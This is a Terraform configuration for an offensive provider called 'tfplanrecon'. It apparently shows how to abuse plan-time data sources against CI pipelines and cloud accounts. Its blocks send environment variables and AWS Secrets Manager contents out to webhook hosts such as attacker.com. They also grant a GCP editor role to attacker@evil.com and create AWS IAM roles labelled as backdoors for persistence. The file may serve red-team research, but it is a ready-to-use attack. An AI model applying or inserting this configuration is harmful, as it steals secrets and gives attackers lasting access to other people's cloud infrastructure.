terraform {
  required_providers {
    tfplanrecon = {
      source  = "registry.terraform.io/rileydakota/tfplanrecon"
    }
  }
}

provider "tfplanrecon" {
}

# Environment variable exfiltration via HTTP POST
data "tfplanrecon_env_var_exfil" "example" {
  url = "https://your-webhook-here.com/exfil"
}

# Environment variable printing to console
data "tfplanrecon_env_var_print" "example" {
  base64_encode = false
}

# Environment variable printing to console (base64 encoded)
data "tfplanrecon_env_var_print" "encoded_example" {
  base64_encode = true
}

# GCP IAM binding creation
data "tfplanrecon_gcp_iam_binding" "example" {
  project = "my-target-project"
  role    = "roles/editor"
  member  = "user:attacker@evil.com"
}

# AWS IAM role creation with attacker account access
data "tfplanrecon_aws_iam_role" "example" {
  role_name     = "tfplanrecon-backdoor"
  aws_principal = "123456789012"  # Attacker's AWS account ID
  description   = "Backdoor role for persistence"
}

# AWS IAM role creation with specific user access
data "tfplanrecon_aws_iam_role" "user_example" {
  role_name     = "tfplanrecon-user-backdoor"
  aws_principal = "user:attacker"
  description   = "User-specific backdoor role"
}

# AWS Secrets Manager exfiltration
data "tfplanrecon_aws_secrets" "secrets_console" {
  region = "us-east-1"
}

# AWS Secrets Manager exfiltration to webhook
data "tfplanrecon_aws_secrets" "secrets_exfil" {
  region      = "us-west-2"
  webhook_url = "https://attacker.com/secrets"
}
